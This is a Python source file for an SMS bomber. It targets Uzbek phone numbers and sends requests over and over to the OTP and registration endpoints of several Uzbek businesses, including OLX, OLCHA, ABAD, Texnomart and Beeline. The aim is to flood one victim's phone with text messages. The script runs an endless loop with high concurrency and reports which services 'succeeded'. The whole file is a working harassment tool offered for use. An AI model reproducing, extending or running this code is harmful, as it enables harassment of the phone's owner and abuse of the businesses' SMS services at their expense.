from services import SERVICES

from aiohttp import ClientSession
import platform
import os
import asyncio


def clear_terminal():
    if platform.system().lower() == "windows":
        os.system("cls")
    else:
        os.system("clear")

"""
def input_phone_number(num_text):
    while True:
        try:
            number = input(num_text)
            number = number.replace('+998', '') if number.startswith('+') else number
        except Exception:
            pass
        if len(number) == 9:
            break
        else:
            print(bcolors.BOLD + "Namuna: 901234567 yoki 991234567")
            continue
        
    return number

def input_floodwait(floodwait_text):
    while True:
        try:
            second = int(input(floodwait_text))
        except Exception:
            print(bcolors.BOLD + "[1 - 7]gacha SON! Asabimi buzma!?")
            continue
        
        if second in range(1, 8):
            break
        else:
            print(bcolors.BOLD + "[1 - 7]gacha SON! Asabimi buzma!?")
            continue
        
    return second
"""

class SMSBomber:
    def __init__(self, number: str, second: int):
        self.number = number
        self.second = second

    async def send(self, sem, session, service: dict):
        link_service = service['link']
        name_service = service['name']
        method_service = service['method']
        header_service = service['HEADER']
        payload_service = service['with_data']
        payloads = payload_service['data']
        params = service['with_param']['params']
        
        try:
            async with sem:
                if method_service == 'GET':
                    async with session.get(
                        url=link_service.format(self.number) if not payload_service['ok'] else link_service,
                        headers=header_service,
                        data=payloads,
                        params=params) as response:
                        if response.status == 200:
                            result = await response.text()
                            status = await self.suck_or_not(name_service, str(result))
                        else:
                            status = await self.suck_or_not('false', 'false')
                            
                        #return (f"{name_service}"+" | " + f"{self.number}" + " | " + status)
                else:
                    if name_service == 'OLX Uzbekistan':
                        payloads['phone'] = self.number
                    elif name_service == 'OLCHA Uzbekistan':
                        payloads['phone'] = int('998' + self.number)
                    elif name_service == 'ABAD Uzbekistan':
                        payloads['username'] = '+998' + self.number
                    elif name_service == "Texnomart Uz":
                        payloads['phone'] = '+998' + self.number
                        
                    async with session.post(
                        url=link_service.format(self.number) if not payload_service['ok'] else link_service,
                        headers=header_service,
                        data=payloads,
                        params=params) as response:
                        if response.status == 200:
                            result = await response.text()
                            status = await self.suck_or_not(name_service, str(result))
                        elif response.status == 201:
                            status = await self.suck_or_not(name_service, 'ok')
                        else:
                            status = await self.suck_or_not('false', 'false')
                            
                        #return (f"{name_service}" + " | " + f"{self.number}" + " | " + status)
        except ConnectionError:
            return ("Connection Error! " + name_service)
        except Exception as e:
            return (f'[ERROR] RequestError: {e.__class__.__name__} {e} {name_service}')
    
    async def suck_or_not(self, name, result):
        successfully = "Muvaffaqiyatli!"
        failed = "Muvaffaqiyatsiz"
    
        if name == 'Tashkent UZ' and 'code' in result:
            success = successfully
        elif name == 'Beeline UZ' and 'OK' in result:
            success = successfully
        elif name == 'OLX Uzbekistan' and 'ok' in result:
            success = successfully
        elif name == 'OLCHA Uzbekistan' and 'ok' in result:
            success = successfully
        elif name == 'ABAD Uzbekistan' and result == 'ok':
            success = successfully
        elif name == 'Texnomart Uz' and 'true' in result:
            success = successfully
        else:
            success = failed
            
        return success
    
    async def run(self):
        tasks = []
        sem = asyncio.Semaphore(1000)
        async with ClientSession() as session:
            while True:
                for service in SERVICES:
                    task = asyncio.ensure_future(
                        self.send(
                            sem,
                            session,
                            service['service']
                        )
                    )
                    tasks.append(task)
                    await asyncio.sleep(self.second)
                responses = asyncio.gather(*tasks)
                await responses

def get_res(number, s):
    try:
        clear_terminal()
        my_scraper = SMSBomber(number, s)
        loop = asyncio.get_event_loop()
        future = asyncio.ensure_future(my_scraper.run())
        loop.run_until_complete(future)
    except KeyboardInterrupt:
        clear_terminal()
    except Exception as e:
        raise e